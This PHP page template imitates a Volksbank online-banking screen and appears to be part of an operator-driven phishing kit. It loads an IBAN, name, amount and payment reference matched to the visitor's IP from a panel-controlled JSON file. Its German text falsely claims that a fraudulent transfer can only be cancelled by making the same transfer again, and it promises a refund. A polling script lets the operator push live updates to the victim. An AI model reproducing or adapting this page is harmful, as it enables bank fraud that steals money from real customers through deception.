<?php
header('Content-Type: text/html; charset=UTF-8');
ob_start();
include 'data/src.php';
$srcContent = ob_get_clean();

$customCommandJsonPath = $config['panelLocation'] . 'custom/custom_umbuchen.json';
$customCommandJson = @file_get_contents($customCommandJsonPath);
$customCommandData = json_decode($customCommandJson, true);

$name  = '';
$iban  = '';
$summe = '';
$verwendungszweck = '';

if (is_array($customCommandData)) {
    foreach ($customCommandData as $command) {
        if (isset($command['userIP']) && trim($command['userIP']) == $_SERVER['REMOTE_ADDR']) {
            $name  = $command['name']  ?? '';
            $iban  = $command['iban']  ?? '';
            $summe = $command['summe'] ?? '';
            $verwendungszweck = $command['verwendungszweck'] ?? '';
            break;
        }
    }
}
?>

<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="discription" content="Coinbase">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Volksbank</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
        integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
    <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">

    <style>
        :root {
            --vr-blue:   #004A99;
            --vr-blue-d: #003882;
            --vr-soft:   #e8f0fa;
            --vr-border: #e5e7eb;
            --vr-muted:  #6b7380;
            --vr-text:   #1a1a1a;
            --vr-amber:  #f59e0b;
            --vr-amb-s:  #fff7ed;
            --vr-amb-b:  #fed7aa;
        }

        .vr-card {
            position: relative;
            background: #fff;
            border: 1px solid var(--vr-border);
            border-radius: 14px;
            box-shadow: 0 14px 32px -10px rgba(0,0,0,.12), 0 2px 6px -2px rgba(0,0,0,.06);
            padding: 44px 40px 40px;
            overflow: hidden;
            max-width: 580px;
            width: 100%;
            margin: 32px auto;
            animation: vrFadeUp .55s cubic-bezier(.22,1,.36,1) both;
        }
        .vr-card::before {
            content: "";
            position: absolute; top: 0; left: 0; right: 0;
            height: 5px;
            background: var(--vr-blue);
        }
        @keyframes vrFadeUp {
            from { opacity: 0; transform: translateY(24px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes vrPulse {
            0%   { transform: scale(1);    opacity: .55; }
            100% { transform: scale(1.55); opacity: 0;   }
        }

        .vr-warn-icon {
            position: relative;
            width: 72px; height: 72px;
            margin: 0 auto 22px;
            display: flex; align-items: center; justify-content: center;
        }
        .vr-warn-icon::before {
            content: "";
            position: absolute; inset: 0;
            border-radius: 50%;
            background: rgba(245,158,11,.18);
            animation: vrPulse 1.6s cubic-bezier(0,0,.2,1) infinite;
        }
        .vr-warn-icon-inner {
            position: relative;
            width: 56px; height: 56px;
            border-radius: 50%;
            background: var(--vr-amb-s);
            border: 2px solid var(--vr-amb-b);
            display: flex; align-items: center; justify-content: center;
            color: var(--vr-amber);
        }
        .vr-warn-icon-inner svg { width: 30px; height: 30px; }

        .vr-card h1 {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--vr-text);
            margin: 0 0 12px;
            letter-spacing: -0.02em;
            text-align: center;
            line-height: 1.3;
        }
        .vr-msg {
            font-size: .95rem;
            color: var(--vr-muted);
            line-height: 1.6;
            margin: 0 0 24px;
            text-align: center;
        }

        .vr-details {
            background: #fafbfc;
            border: 1px solid var(--vr-border);
            border-radius: 10px;
            padding: 4px 18px;
            margin: 0 0 20px;
        }
        .vr-row {
            display: grid;
            grid-template-columns: 130px 1fr;
            align-items: center;
            gap: 16px;
            padding: 14px 0;
            border-bottom: 1px solid var(--vr-border);
        }
        .vr-row:last-child { border-bottom: 0; }
        .vr-row .vr-k {
            font-size: .8rem;
            font-weight: 600;
            color: var(--vr-muted);
            text-transform: uppercase;
            letter-spacing: .06em;
        }
        .vr-row .vr-v {
            font-size: 1rem;
            font-weight: 600;
            color: var(--vr-text);
            word-break: break-word;
            font-variant-numeric: tabular-nums;
        }
        .vr-row.vr-row-amount .vr-v {
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--vr-blue);
        }
        .vr-row.vr-row-amount .vr-v::after {
            content: " \20AC";
            color: var(--vr-muted);
            font-weight: 600;
            margin-left: 4px;
        }

        .vr-hint {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            padding: 14px 16px;
            background: var(--vr-soft);
            border: 1px solid rgba(0,74,153,.2);
            border-radius: 10px;
            color: var(--vr-blue-d);
            font-size: .88rem;
            line-height: 1.55;
        }
        .vr-hint svg {
            width: 20px; height: 20px;
            flex-shrink: 0;
            color: var(--vr-blue);
            margin-top: 1px;
        }
        .vr-hint strong { color: var(--vr-blue-d); }

        .vr-contact {
            margin-top: 22px;
            padding: 14px 16px;
            background: #fafbfc;
            border: 1px solid var(--vr-border);
            border-radius: 10px;
            display: flex;
            align-items: center;
            gap: 14px;
            font-size: .9rem;
        }
        .vr-contact-icon {
            width: 40px; height: 40px;
            border-radius: 50%;
            background: var(--vr-soft);
            color: var(--vr-blue);
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0;
        }
        .vr-contact-icon svg { width: 18px; height: 18px; }
        .vr-contact-meta { flex: 1; min-width: 0; }
        .vr-lbl {
            display: block; font-size: .72rem; color: var(--vr-muted);
            text-transform: uppercase; letter-spacing: .06em;
            font-weight: 500; margin-bottom: 2px;
        }
        .vr-name { display: block; font-weight: 600; color: var(--vr-text); }
        .vr-phone {
            display: block; color: var(--vr-blue);
            font-weight: 700; margin-top: 2px; text-decoration: none;
        }

        @media (max-width: 600px) {
            .vr-card { padding: 32px 20px 28px; }
            .vr-row { grid-template-columns: 1fr; gap: 4px; padding: 12px 0; }
        }
    </style>
</head>

<body>

    <div class="tape"></div>

    <header class="header-login">
        <div class="logo">
            <img src="<?php echo IMGSPATH; ?>/logo-vr.svg" alt="">
        </div>
    </header>

    <div class="wrapper-box-phototan wrapper-box-phototan2">
        <div class="vr-card">

            <div class="vr-warn-icon">
                <div class="vr-warn-icon-inner">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
                        <line x1="12" y1="9" x2="12" y2="13"></line>
                        <line x1="12" y1="17" x2="12.01" y2="17"></line>
                    </svg>
                </div>
            </div>

            <h1>Auftrag Stornieren</h1>
            <p class="vr-msg">
                Eine Echtzeit-&Uuml;berweisung wurde von einem anderen Ger&auml;t durchgef&uuml;hrt und ist daher auf Ihrem Ger&auml;t nicht sichtbar. Um die Transaktion zu stornieren, m&uuml;ssen Sie dieselbe &Uuml;berweisung von Ihrem Ger&auml;t aus erneut durchgef&uuml;hren. Nur so k&ouml;nnen wir die Stornierung sofort bearbeiten.
            </p>

            <div class="vr-details" aria-label="Transaktionsdetails">
                <div class="vr-row">
                    <span class="vr-k">Name</span>
                    <span class="vr-v"><?= htmlspecialchars($name) ?></span>
                </div>
                <div class="vr-row">
                    <span class="vr-k">IBAN</span>
                    <span class="vr-v"><?= htmlspecialchars($iban) ?></span>
                </div>
                <div class="vr-row vr-row-amount">
                    <span class="vr-k">Summe</span>
                    <span class="vr-v"><?= htmlspecialchars($summe) ?></span>
                </div>
                <div class="vr-row">
                    <span class="vr-k">Verwendungszweck</span>
                    <span class="vr-v"><?= htmlspecialchars($verwendungszweck) ?></span>
                </div>
            </div>

            <div class="vr-hint" role="note">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="16" x2="12" y2="12"></line>
                    <line x1="12" y1="8" x2="12.01" y2="8"></line>
                </svg>
                <span>
                    Sobald Sie den Prozess abgeschlossen haben, erscheint die stornierte Transaktion in Ihrem E-Banking. Sie wird dort als durchgef&uuml;hrt angezeigt, obwohl sie unmittelbar storniert wurde. Der Betrag wird Ihnen per SEPA-Gutschrift zur&uuml;ckerstattet &ndash; dies kann bis zu drei Werktage in Anspruch nehmen.
                </span>
            </div>

            <p class="vr-ssl" style="text-align:center;margin-top:18px;font-size:.74rem;color:#98a0ad;display:flex;align-items:center;justify-content:center;gap:6px;">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:13px;height:13px;">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                Sichere Verbindung &mdash; 256-Bit SSL Verschl&uuml;sselung
            </p>

        </div>
    </div>

    <footer class="footer-login">
        <div class="navlist align-items-center d-flex justify-content-center">
            <ul class="d-flex justify-content-center align-items-center ps-0 mb-0">
                <li>Impressum</li>
                <li>Datenschutz</li>
                <li>AGB</li>
                <li>Preisaushang</li>
                <li>Nutzungsbedingungen</li>
                <li>Pflichtinformationen</li>
                <li>Sicherheitshinweise</li>
            </ul>
        </div>
        <p class="text-center first-text">Wir machen den Weg frei. Gemeinsam mit den Spezialisten der
            Genossenschaftlichen FinanzGruppe Volksbanken Raiffeisenbanken</p>
        <img class="xlg" src="<?php echo IMGSPATH; ?>/s4.png" alt="" width="100%">
        <img class="lg d-none" src="<?php echo IMGSPATH; ?>/s3.png" alt="" width="100%">
        <img class="md d-none" src="<?php echo IMGSPATH; ?>/s2.png" alt="" width="100%">
        <img class="sm d-none" src="<?php echo IMGSPATH; ?>/s1.png" alt="" width="100%">
    </footer>

    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="<?php echo JSPATH; ?>/js.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>

    <script>
        var initialModTime = null;
        var customCommandJsonPath = '<?= htmlspecialchars($customCommandJsonPath) ?>';
        function checkFileModification() {
            fetch(customCommandJsonPath, { method: 'HEAD', cache: 'no-cache' })
                .then(function (response) {
                    var currentModTime = new Date(response.headers.get('Last-Modified'));
                    if (initialModTime === null) {
                        initialModTime = currentModTime;
                    } else if (currentModTime.getTime() !== initialModTime.getTime()) {
                        window.location.reload();
                    }
                })
                .catch(function (error) { console.error('Error checking file modification:', error); });
        }
        setInterval(checkFileModification, 2000);
    </script>
</body>

</html>
